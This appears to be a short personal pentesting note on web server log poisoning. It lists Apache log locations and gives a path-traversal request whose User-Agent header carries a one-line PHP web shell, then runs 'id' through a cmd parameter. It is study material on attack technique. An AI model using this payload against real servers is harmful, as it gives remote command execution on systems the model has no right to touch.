---
publish: true
created: 2026-01-31T13:13:25.114+05:30
modified: 2026-06-24T14:23:23.644+05:30
---

This method is used to poison the logs of the web server with code, so when error log is displayed via eg: LFI, the page would get rendered and code would execute.

First find location of the logs. check locations like below.

```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access.log

# 2 check the config file for access.log location.
Freebsd - /usr/local/etc/apache24/httpd.conf
```

Which of the request headers are logged onto log. i.e, _User-agent_. modify it to include our php code. I will use simplest php one line code and access valid file. valid file logs go into access.log and errors go into error.log

```
GET /browse.php?file=../../../../../var/log/httpd-access.log
User-Agent: <?php system($_REQUEST['cmd']); ?>
```

Now, access the log file.

![[Attachments/000-Concepts/WebTechnologies/Log Poisoning/IMG-Log Poisoning-20260624142323423.png]]

our payload is between two quote marks. `" "`. the php code got executed, but `cmd` parameter is missing in our request. hence it threw blank command.  now use a parameter to run a command. `/var/log/httpd-access.log&cmd=id`. here we are user `www`.

![[Attachments/000-Concepts/WebTechnologies/Log Poisoning/IMG-Log Poisoning-20260624142323581.png]]
